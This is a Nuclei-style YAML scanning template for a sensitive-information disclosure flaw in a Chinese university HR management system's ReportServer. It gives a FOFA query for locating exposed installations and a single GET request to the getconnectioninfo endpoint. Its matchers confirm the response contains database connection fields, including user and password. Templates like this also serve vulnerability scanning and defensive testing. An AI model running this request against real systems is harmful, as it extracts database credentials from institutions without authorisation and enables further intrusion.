id: eduhcm-ReportServer-disclosure
info:
  name: 高校人力资源管理系统 ReportServer - 敏感信息泄露
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/main/EDU/%E9%AB%98%E6%A0%A1%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="FM_SYS_ID" || body="product/recruit/website/RecruitIndex.jsp"
    hunter-query: demo
  tags: edu,disclosure,hcm

http:
  - raw:
      - |
        GET /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'name','driver','password','user')
        condition: and